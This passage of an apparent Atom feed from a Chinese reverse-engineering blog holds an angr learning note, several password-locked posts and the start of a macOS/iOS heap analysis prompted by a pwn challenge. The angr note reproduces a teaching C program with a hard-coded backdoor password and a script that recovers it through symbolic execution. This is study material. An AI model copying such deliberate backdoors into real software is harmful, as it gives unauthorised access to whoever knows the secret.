BPgiOnXqIwyV4qbiYlhBfEcKJSUKl5l9KBHYRTYiOglIt0bACA2MC5INnXGOchkMXEfJUHvvVkTxrnBze90VOYPpygbyF0aeNaEg7hOdB+g19S2NDVZkuL0XgODmf3p2TFBniTvV14EqlJUTAO//aJnPrCHsdsyEG85t7p7FtscAaWxiOld6nCmEiPrQlQIeevzOX/K3E1zP0yzbHD+fGOpMPFxNYJ+xg6O7LYEc6yWLl8xu9oFY1q3J30Wlmos9X4bWYZ3hFEOO6c3/J0zYw8EV/FJYuUk+T6yg11h183hlg4fg82N7wKvJzVpL2MGueEsnp5nq+UAgnGc+Kz+PnKO0ij5bPT7umVk94rNbxw8EpPzrzhPHMPf1ExAdO+8NTwanoXzO5KyfycaBzPpfRS78NnfddZtm9yIboAeey7/vVlLEOqsq046M7EjuBS/KJ4FEUaMHQFZNk2ipx3j7wVGJIPfWY1KTrwcYTWqFtwl/nBOK4A3KgZl0tISEJ/Ibco6k8ldKhj5spcerb4t9JN6cTktg6iVP6yiLOoJKa5VJDg7NWras8jeuNr3Asr3Qct5Omw8XHEMPXfBlDgSmjM4wLuwE1X9l7eiYdHr5uBfrzYEiPLj+9je1id9ClOin48kVnkf5R5nSYyItEP2moWgmT8+FAgdewt03W2d1zfzUI/PQSqUJimznQSgQ33sjb/7bBYHPzaGtSNkmuVFFDxHNIjIM0dVYXYmpG17Wlz4rmPVeIWYcCuyB70E11ZmdHrvMnurtI/CwRTOxC4keegMopBQ6HZtW1sgHY/Ja3Xpf6Z+hDNVJ3wJejmagnf/FrW3d2YsDp3YJ8O/CF0M3B1D3YIUuUfy66L3g9MeILAcWGUdRMHQqP7iA6/r4HRg1iPEEq64hLzX2CegGROeiYzEN5xAW3CRM/Et7XMZGHjcyfoqQrcLX2EECn+b1wh+lRHP8pyUHjDUgLK92KP63vidhXyhOpB3KEkGuSPQcE5/PjxarLJZssdKse+8awfnVErOynYMRAXRpo83n29TOAlG77WRcULyOS6vYid3j29nUtDdj87VnPKD6q+uXCRDd/uodsbyOnAemrqb/knGeTkC3Y1F40hUhgGYq2bcUcrrsmTPi8IbdDCj6sNrOxLlBuOvOme/g3/OZ6WOG99Ok0FZ7A6ukcVAWkiKAkAolwhKXTl8MxCBoD7xYB4zFlEBJwJYWLB3KlD/yjCKhBKhaAYNFkuzLnWg9Z/kjENbVoHgDpywiIYgClxsmZczMq98Bs8/hb0J5EJPxHsXCYFC3w+pq39/PRWwLCftIfKu26RwlR6OP92hnPYYJCIm43sRfcrosr0oz+TO+NjNzGzoSPq8JKLWd6HExnfsv/2L3rG66XokO9Dk4/Bokk8RIExUN4wF7CDOcoFSrISYipSZYfh8OAAeNbIB6zHX3rTZeZIRrigGbFgTe2Oic1kywEaj8PJr/HHzzB3CTJpvTCH8Lb9DMA/j90G270EAsS11cyIykWfsyI8aN7SuldYmycs4Bda3XbcXGdA2QaNDRggSNmNlSqziUlatKYehQJs0Zsj0T4kzUkmul/XXT0XUZ1TiWS2NdTP9nf24rB9F/8+Wxadpnha5uzDGWURDQVohgORZaLBSLEsM9PscUX8kSHLNo/3ufqNcwKAfs7yoG9QOfQVAymR/F9JbBWoQ37lzVDSg6nPKKVPyF3PwcLjujBU1uOx210l8903ARmPQMruAkalsivU0otNzvn/Y4L3zr3GGbkkSB/a71EeYHweT3b6posedjwkp6Llaa7pHfQt0nYDqvA55fCkmGtcdsz8JXEKE7KfXdUOU0UoSaIbjBqAdWJ3NR0G66KCve3TVOvIiB8ywoMVHqAsIHe7OOvGSlt5Ueq5pOPQfgMjrVaN/foK+xidZvJCwFJUkF2FMarvPhgxfF4L90JXipjWQHf10Yt2/K1lWpKzPNCl6gRbt4bjUxvOXtxpqQrJt07AiVXVV7U6B6wHh0mel1jyxqhKLOld/ujGfVCOXw5NsYcjaP2AWDfLJ8EyWi0n5pVU/HYPmqcf0WBpgS6h+fhJgyopCCmoirQuJSjH2gTMMCXZTwv66k/PGNrTSsSXKH+H0XohTJUN0N77Mg1uOoURoV9BxCdhE3UtpSBZ5F9GfiyYjSRJK32bJ8vKHKerYMnU5JpdWiUQerZvR+Qy7EpEjQe2IDJmI46Zy9Y3iB4ecR5bOKs5k+uve78knqR4MRnLnv7UcOrOd/TCZ/kEmFVtyEr8ectzv05HxUMVDmUCLpfcv9QWtzHyCxhnJOzbDVDRPLO+//m+89XadPRHJqBWDSpTPCFvIKBrrO1TyG72dm496QUJB/3ef3sNTEuvItAnrmuKIQOd7x1rTGEPcrXA2kFTfWKRanuylPg6DrD+mwkuP4wxez2XoqIklWOGhV/+025Y7RCWd0XhVips0/fzETfl5aSza6Cm/ORpu4yeUaM3Y/PMJGxG5dHwfaPb4/KBWPvRF65cx82IZFh0HOP5g3ZkH7XvmyRSzO/RoMiK0j7wee1czlm0fdzmHaSgyaIBFe9/+yljy6z+mzymET/lHsI0Eu7hbzN3HwFDzLPThzkgkYoxNunNJBgiL5/wFUKHFntFoTwwj6O6e4ISQT6YxzvuM3Byi7dPGcO4GgCqMtXQmeIIAeFWKbHfFsxlHymVcjnQPmhW/GwqYMF2I13EpUhI1XflIDmrOkP5a5njcv/22RNNj7//TFS82GeqeUW/ySCErQaJ2m0tuDfCCj74p5VjViaW6W4UgptN0GOgXIc/LaY7M20zvtvxPM2K6qYmFmnWTaMmormIwWvn39htJfZKbJ0ctduuS+N4tUxgbiTJmjHjij+cxbpyhk4xesJ/lAgT/50go5AZvGZmNlAlTgQWzMrAgmrc6hOY1pl329dMg7O1xb510AtNtpje9cFgGOCRYO2qJk5/GBHK2artUhqhuZ0JoTMnsWhaMlLJoPLRdTjSQKUe8deVLTzvpJxGNQMF599vPF5DJ0/hdlXDuh9hHBu0OgJ3ejDiXT0TbuzZLvBSSWuqIUHl1aoQLD/tH3gFqQ09hzpMFiEYYMcnsssCYtaWlrJg+W3QvQNgNQtniKf3u0o72+QwLJ8Z7M8z1We9kgMZZ7qYez+lkkMK8mUVA3AjkqbrM4/KuOhb+HlqVeFHAwWiS4tTgI5lWi4PcXIesm3QSFB+qaxnJOo1WwlTlJ1O0tCQaYsETFtO1UYB4Ct39fUtRTRkRarWldbHL1IohOO1aDRRsMJn/tiWSCF27dOf8zjmjc+WYBricTZRRMKJrdnuP+LS58Vu8NkNXJ73SzLsaaKHNH8F7Kftx0RXTtDbVP2ikuL68WoWCLm9MdPdRVEJTZgKKQMeljVCw/7d/b1djx/Twfe9w5B0vpWa13xp/c8MTuQ8uyVakPQQVzScHfSsUvQEIGGa9sfHxA75zoS5YfE65sJnSSPkBhwRwEpatRcWs2JHEoPUBl8McqQZEDiaS6u6hDkT+GinEFjwAjiDh6O+VW1RLZJqvQBPeVqOur4Hnb1uJP5lkA8Xb85rgIFaWHh1GLsv41Ij+FFdWxaGNGroq9gQkKLAUa28N82vTO++ReqOYXbfMFuSjt18qYOowv2evu5fkUpz/nX5dmc+vd0I89/jgXH5KZViwD7/lEVYBn66yt2KYVXXnD8Iy16DhU4INqYUu92EkIektD98C03oC1tuIxJ5x0MyxNtiKXOc2RpENmaGJBph6dMW2oa3KGpsrCRXSAjJJU2aJNB2BxgpfmnbhKiVzGMq6A4IFBJ3IP7jvQr35DXGKSFsD5fDL8NR5CGhUs61BhaCYKLRWAWdwOfnBM4DfHj3rXKEiE0ttJ5OHPrMF5f4SnpwgtmKl8vMDhJH09yDlhTpGPwD+MzCByMQRu6mqYkI6l475fZFnTB/D1iy3w3G6mIHLiTsBHax3tXqMlya7UBeGu9aqTR5xEks4RQ1LoH+7UGnNALIB/CE6MizWe2uAaYHJL8lVrlcyYYbBbJEvQwG84ErB78/Scx+EfblK0+2pE0ijDwAYrivB/F2INGiDKCKumphduwjiQDj8HDgWj41IVk0KQFqi4zFa1cxLHavGLwnsBo7Rsg6pgIdiOHmPEVkG/XfrbMef1fzo29mCUONmr1upGbHAVDxkxM2yyFqQf7bVq8ky8JfqEFMunHs57avVXUIX4fZdgUVS4lbv68pTOr6g95tqnSQ5I+whzwm9vtDVR37770+gswLX13eHW18V0zq+jhmTNY329Uixy75xFB8kSSVDserV0gMEQOKRe3aZhxuI/1IU6nLx1BcqHcEfiwlxJj/yF30P3+MOjGJk8be27AaUv5Wo9J+rU0iYXY3hXXgamWnff602Ex4BVfeDJAZa3Ozcqb+uHd7jkvZ8ADeEQFPOQKRtCfEC1UW4mkW8iAnOwc72EZVxhBpnFU7oTc5FgIpbyamXaAGV6IWPrYEOobGOfwj4WT69fOGI8hXutHR+yjA49GnFaXc5aaFLmawLyY3NW32VL48tC/HRcwNn66i4CKOBnV18/eUXBC28Vs021j0tBl7KzikOGli/fxSAYX/54iWdKSeAAyPiJNa082cpk9Nc5yixmyv2SSzDuMXXILQsEs+6wznKkcefzWR6bjVV3UHbvUyNST7LMheFMLFMH/NSqO8yw0eN1WAlIxvEueHL1orJUVtzqiECj416/djzRUkDiQ+eiOgwAv6+H96auKkpiz14qtI8C3b1n6e/ke0vKClR+LHekFyFQ1wIE5TPqooiyYP9UQX1p87J/53bbKK3F8Z68lo19pu9pulC2FrF8XeKSPcjjkS/znvx4VHQYbfeKj8re+w+p/E1AQ9qCSY2d6Z4WlxS1x4e1ZRF7CLHKhECudFITdCkL9zePVUUTjlBMfdcsKzrLfUY1TEUhdaZVQ7+Rm0tfLCeE5N2VPxEXCSOrsf0ZVr1QpmXPlSKLip+NfL+ti7oBIrrjlu7KmBxO9EVWDb3sjere7gmFvxRHEkuUnIQIDd1PY0Eq694iVCmyS4tRAANJ6Z1PJkd9by23XR+E4NyuoOo579hIgNptA2gLLixcPeC44Uhqq7co2cYnPm7trFJDNOmwV2QBOpOsxrU2yK/iFS2XjAiwDmk6JGm4De+YlnOGyysxVeE0AUireCFO4P2HgUsv7OxC42dQ82q66W9AlUIs5x/y/7heBuJI5O/yljw/cIab23YTngzPqZjsRQKhQQ/ZlLo3qxGgFECRW7oYnRJuYNzKnNjQk4fDtQvOlcNIrHuhcYdmIlcMqozfsVYF/8aWcZqxkRQlDmZ95idVgIDq1WdJDQSmRqEAYcUvpyK6bM9xeFR+IxFtOtNIjw5b5RjrO2uupJS9/vQhzfRn2h/8lnFKEaEPcKq+DvnCMCt+b9WLaH9ZM+JzcbqbgOAMC4mhnVJMAcWWPmoD2Sf6rQArYdJjiEhVTVqDRJr63hcGSa1j6LuLSzCz4ygjQytV+Q3X2Zu2XWs+AY46lNGkUH9gJmpLPlvHS1koQ20mnO5LxFEhoNw7Q/fN/8IrI5SQTvP+ka51N1cKqcIBDC8uCFAjplNeGCimsTDM1PBvSC7nqNg==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t 